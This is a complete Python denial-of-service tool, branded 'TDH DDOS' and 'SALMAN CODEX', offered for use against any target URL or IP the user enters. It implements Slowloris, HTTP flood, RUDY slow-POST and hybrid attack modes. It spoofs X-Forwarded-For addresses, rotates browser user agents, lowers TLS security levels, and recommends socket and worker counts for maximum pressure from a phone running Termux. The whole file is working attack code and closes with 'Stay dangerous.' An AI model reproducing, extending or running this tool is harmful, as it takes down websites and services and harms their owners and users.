#!/usr/bin/env python3
# ============================================================
#   TDH DDOS  |  Onyx67 Engine  v4
#   Fixed live counter + better socket tracking
# ============================================================

import socket
import random
import time
import threading
import ssl
import urllib.parse
import sys
import os
from concurrent.futures import ThreadPoolExecutor

class C:
    R  = "\033[91m"
    G  = "\033[92m"
    Y  = "\033[93m"
    B  = "\033[94m"
    M  = "\033[95m"
    C  = "\033[96m"
    W  = "\033[97m"
    D  = "\033[90m"
    BOLD = "\033[1m"
    END  = "\033[0m"

def clear():
    os.system("clear" if os.name != "nt" else "cls")

def banner():
    clear()
    print(f"""{C.C}{C.BOLD}
███████╗ █████╗ ██╗     ███╗   ███╗ █████╗ ███╗   ██╗
██╔════╝██╔══██╗██║     ████╗ ████║██╔══██╗████╗  ██║
███████╗███████║██║     ██╔████╔██║███████║██╔██╗ ██║
╚════██║██╔══██║██║     ██║╚██╔╝██║██╔══██║██║╚██╗██║
███████║██║  ██║███████╗██║ ╚═╝ ██║██║  ██║██║ ╚████║
╚══════╝╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝

 ██████╗ ██████╗ ██████╗ ███████╗██╗  ██╗
██╔════╝██╔═══██╗██╔══██╗██╔════╝╚██╗██╔╝
██║     ██║   ██║██║  ██║█████╗   ╚███╔╝
██║     ██║   ██║██║  ██║██╔══╝   ██╔██╗
╚██████╗╚██████╔╝██████╔╝███████╗██╔╝ ██╗
 ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝
{C.END}{C.M}{C.BOLD} ══════════════════════════════════
                    SALMAN CODEX  •  Hybrid Engine
              ══════════════════════════════════{C.END}
{C.D}           Slowloris  •  HTTP Flood  •  RUDY  •  Hybrid
                 Pure Python  |  Termux Ready{C.END}
""")

# Shared state
sockets_list = []
lock = threading.Lock()
stats = {
    "active": 0,
    "sent": 0,
    "errors": 0,
    "bytes": 0,
    "success": 0,
    "peak": 0
}
running = True

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
]

def resolve_host(target):
    target = target.strip()
    if not target.startswith(("http://", "https://")):
        if ":" in target and target.count(":") == 1:
            host, port = target.rsplit(":", 1)
            try:
                return host, int(port), "/", int(port) == 443
            except:
                pass
        return target, 80, "/", False
    parsed = urllib.parse.urlparse(target)
    host = parsed.hostname or target
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    path = parsed.path or "/"
    if parsed.query:
        path += "?" + parsed.query
    return host, port, path, parsed.scheme == "https" or port == 443

def create_socket(host, port, use_ssl=False, timeout=7):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        except:
            pass
        s.connect((host, port))
        if use_ssl:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            try:
                ctx.set_ciphers("DEFAULT@SECLEVEL=0")
            except:
                try:
                    ctx.set_ciphers("DEFAULT@SECLEVEL=1")
                except:
                    pass
            try:
                ctx.minimum_version = ssl.TLSVersion.TLSv1
            except:
                pass
            s = ctx.wrap_socket(s, server_hostname=host)
        return s
    except Exception:
        with lock:
            stats["errors"] += 1
        return None

def random_path(base="/"):
    options = [
        f"?id={random.randint(1,999999)}",
        f"?page={random.randint(1,9999)}",
        f"/search?q={random.randint(10000,99999)}",
        f"/?{random.randint(0,999999)}={random.randint(0,999999)}",
        f"/index.php?id={random.randint(1,9999)}",
        f"/",
        f"/home",
        f"/login",
    ]
    if base == "/" or not base:
        return random.choice(options)
    return base.rstrip("/") + random.choice(options)

def get_headers(host):
    return [
        f"User-Agent: {random.choice(USER_AGENTS)}",
        "Accept-Language: en-US,en;q=0.9",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Encoding: gzip, deflate, br",
        "Connection: keep-alive",
        "Cache-Control: no-cache",
        f"Host: {host}",
        f"Referer: https://{host}/",
        f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
    ]

# ───────── Slowloris ─────────
def slow_init(host, port, use_ssl, path):
    s = create_socket(host, port, use_ssl, timeout=8)
    if not s:
        return None
    try:
        p = random_path(path)
        s.send(f"GET {p} HTTP/1.1\r\n".encode())
        for h in get_headers(host):
            s.send(f"{h}\r\n".encode())
        return s
    except:
        try: s.close()
        except: pass
        return None

def slow_keep(s):
    try:
        s.send(f"X-{random.randint(1,9999)}: {random.randint(1,999999)}\r\n".encode())
        return True
    except:
        return False

# ───────── RUDY ─────────
def rudy_init(host, port, use_ssl, path):
    s = create_socket(host, port, use_ssl, timeout=8)
    if not s:
        return None
    try:
        cl = random.randint(2000000, 15000000)
        headers = get_headers(host) + [
            f"Content-Length: {cl}",
            "Content-Type: application/x-www-form-urlencoded",
        ]
        req = f"POST {random_path(path)} HTTP/1.1\r\n"
        for h in headers:
            req += f"{h}\r\n"
        req += "\r\n"
        s.send(req.encode())
        return s
    except:
        try: s.close()
        except: pass
        return None

def rudy_keep(s):
    try:
        s.send(bytes([random.randint(65, 90)]))
        return True
    except:
        return False

# ───────── Flood ─────────
def flood_once(host, port, use_ssl, path):
    s = create_socket(host, port, use_ssl, timeout=3)
    if not s:
        return
    try:
        p = random_path(path)
        req = f"GET {p} HTTP/1.1\r\n"
        for h in get_headers(host):
            req += f"{h}\r\n"
        req += "\r\n"
        data = req.encode()
        s.send(data)
        with lock:
            stats["sent"] += 1
            stats["bytes"] += len(data)
            stats["success"] += 1
        try:
            s.recv(32)
        except:
            pass
    except:
        with lock:
            stats["errors"] += 1
    finally:
        try: s.close()
        except: pass

def flood_worker(host, port, use_ssl, path):
    global running
    while running:
        flood_once(host, port, use_ssl, path)
        time.sleep(0.008)

# ───────── Socket worker ─────────
def socket_worker(host, port, use_ssl, path, target, mode="slow"):
    global running
    while running:
        with lock:
            if len(sockets_list) >= target:
                time.sleep(0.25)
                continue

        if mode == "rudy":
            s = rudy_init(host, port, use_ssl, path)
        else:
            s = slow_init(host, port, use_ssl, path)

        if s:
            with lock:
                sockets_list.append(s)
                current = len(sockets_list)
                stats["active"] = current
                stats["success"] += 1
                if current > stats["peak"]:
                    stats["peak"] = current
        else:
            time.sleep(0.15)

# ───────── Keepalive (critical fix) ─────────
def keepalive_loop():
    global running
    while running:
        with lock:
            alive = []
            for s in sockets_list:
                try:
                    # test if still alive
                    if random.random() < 0.7:
                        ok = slow_keep(s)
                    else:
                        ok = rudy_keep(s)
                    if ok:
                        alive.append(s)
                    else:
                        try: s.close()
                        except: pass
                except:
                    try: s.close()
                    except: pass
            sockets_list[:] = alive
            stats["active"] = len(alive)
        time.sleep(4)

# ───────── Status (fixed) ─────────
def status_loop(target, mode_name):
    global running
    while running:
        with lock:
            a = stats["active"]
            s = stats["sent"]
            e = stats["errors"]
            b = stats["bytes"]
            ok = stats["success"]
            peak = stats["peak"]
        bar_len = 16
        filled = min(bar_len, int(bar_len * a / max(target, 1))) if target > 0 else 0
        bar = "█" * filled + "░" * (bar_len - filled)
        print(f"{C.C}[{C.W}TDH{C.C}]{C.END} {C.G}{bar}{C.END} {C.Y}{a}/{target}{C.END} │ "
              f"{C.B}Flood:{C.W}{s}{C.END} │ {C.R}Err:{C.W}{e}{C.END} │ "
              f"{C.G}OK:{C.W}{ok}{C.END} │ Peak:{C.M}{peak}{C.END} │ {C.D}{mode_name}{C.END}   ", end="\r")
        sys.stdout.flush()
        time.sleep(1.0)

def get_input(prompt, default=None):
    if default is not None:
        val = input(f"{C.C}[{C.W}TDH{C.C}]{C.END} {prompt} {C.D}[{default}]{C.END}: ").strip()
        return val if val else str(default)
    return input(f"{C.C}[{C.W}TDH{C.C}]{C.END} {prompt}: ").strip()

def main():
    global running
    banner()

    print(f"{C.D}────────────────────────────────────────────────────────{C.END}")
    target = get_input("Target URL / Domain / IP")
    if not target:
        print(f"{C.R}[!] No target. Exiting.{C.END}")
        return

    host, port, path, auto_ssl = resolve_host(target)

    print(f"\n{C.Y}{C.BOLD}  SELECT ATTACK MODE{C.END}")
    print(f"{C.D}  ─────────────────────────────────────{C.END}")
    print(f"  {C.G}1{C.END}  Slowloris      {C.D}— connection exhaustion{C.END}")
    print(f"  {C.G}2{C.END}  HTTP Flood     {C.D}— rapid packet spam{C.END}")
    print(f"  {C.G}3{C.END}  RUDY           {C.D}— slow POST body{C.END}")
    print(f"  {C.G}4{C.END}  Hybrid         {C.D}— max pressure (recommended){C.END}")
    print(f"{C.D}  ─────────────────────────────────────{C.END}")

    choice = get_input("Mode", "4")
    mode_map = {"1": "slow", "2": "flood", "3": "rudy", "4": "hybrid"}
    mode = mode_map.get(choice, "hybrid")
    mode_name = {"slow": "SLOWLORIS", "flood": "HTTP FLOOD", "rudy": "RUDY", "hybrid": "HYBRID"}.get(mode, "HYBRID")

    if mode == "flood":
        sockets = 0
        workers = int(get_input("Flood workers (30-70)", "45"))
    else:
        sockets = int(get_input("Max sockets (400-900 recommended)", "650"))
        workers = int(get_input("Workers (15-28)", "20"))

    force = get_input("Force SSL? (y/n)", "y" if auto_ssl else "n").lower()
    use_ssl = force == "y"

    duration = get_input("Duration seconds (0 = infinite)", "0")
    duration = int(duration) if duration.isdigit() else 0

    print(f"""
{C.C}╔══════════════════════════════════════════════════════╗
║{C.W}{C.BOLD}  SALMAN CODEX DDOS  •  LAUNCH SUMMARY{C.END}{C.C}                        ║
╠══════════════════════════════════════════════════════╣
║{C.END}  Target   : {C.Y}{host}:{port}{C.END}
║{C.END}  SSL      : {C.G if use_ssl else C.R}{use_ssl}{C.END}
║{C.END}  Mode     : {C.M}{mode_name}{C.END}
║{C.END}  Sockets  : {C.Y}{sockets}{C.END}
║{C.END}  Workers  : {C.Y}{workers}{C.END}
║{C.END}  Duration : {C.Y}{'∞ Infinite' if duration == 0 else str(duration)+'s'}{C.END}
{C.C}╚══════════════════════════════════════════════════════╝{C.END}
""")
    print(f"{C.D}Tip: Termux e 650 sockets + 20 workers = stable{C.END}")
    input(f"{C.G}[Press ENTER to launch]{C.END} ")

    print(f"\n{C.G}{C.BOLD}[TDH] Engine starting... oil up{C.END}\n")

    # Start status
    threading.Thread(target=status_loop, args=(max(sockets, 1), mode_name), daemon=True).start()

    # Start keepalive only if we hold sockets
    if mode != "flood":
        threading.Thread(target=keepalive_loop, daemon=True).start()

    start_time = time.time()
    try:
        with ThreadPoolExecutor(max_workers=workers + 6) as exe:
            if mode == "flood":
                for _ in range(workers):
                    exe.submit(flood_worker, host, port, use_ssl, path)
            elif mode == "slow":
                for _ in range(workers):
                    exe.submit(socket_worker, host, port, use_ssl, path, sockets, "slow")
            elif mode == "rudy":
                for _ in range(workers):
                    exe.submit(socket_worker, host, port, use_ssl, path, sockets, "rudy")
            else:
                # Hybrid
                for i in range(workers):
                    if i % 5 == 0:
                        exe.submit(socket_worker, host, port, use_ssl, path, sockets, "rudy")
                    elif i % 3 == 0:
                        exe.submit(flood_worker, host, port, use_ssl, path)
                    else:
                        exe.submit(socket_worker, host, port, use_ssl, path, sockets, "slow")
                for _ in range(max(5, workers // 4)):
                    exe.submit(flood_worker, host, port, use_ssl, path)

            if duration > 0:
                time.sleep(duration)
                running = False
            else:
                while running:
                    time.sleep(1)
                    if duration > 0 and (time.time() - start_time) > duration:
                        running = False
                        break
    except KeyboardInterrupt:
        print(f"\n\n{C.Y}[TDH] Stopping...{C.END}")
    finally:
        running = False
        with lock:
            for s in sockets_list:
                try: s.close()
                except: pass
            sockets_list.clear()
            stats["active"] = 0
        print(f"""
{C.C}╔══════════════════════════════════════════════════════╗
║{C.W}{C.BOLD}  SALMAN CODEX DDOS  •  SESSION ENDED{C.END}{C.C}                          ║
╠══════════════════════════════════════════════════════╣
║{C.END}  Packets Sent : {C.G}{stats['sent']}{C.END}
║{C.END}  Success Conn : {C.G}{stats['success']}{C.END}
║{C.END}  Peak Sockets : {C.M}{stats['peak']}{C.END}
║{C.END}  Errors       : {C.R}{stats['errors']}{C.END}
║{C.END}  Data Moved   : {C.Y}{stats['bytes']//1024} KB{C.END}
{C.C}╚══════════════════════════════════════════════════════╝{C.END}
{C.M}  Stay dangerous.  — Onyx67 × TDH{C.END}
""")

if __name__ == "__main__":
    main()
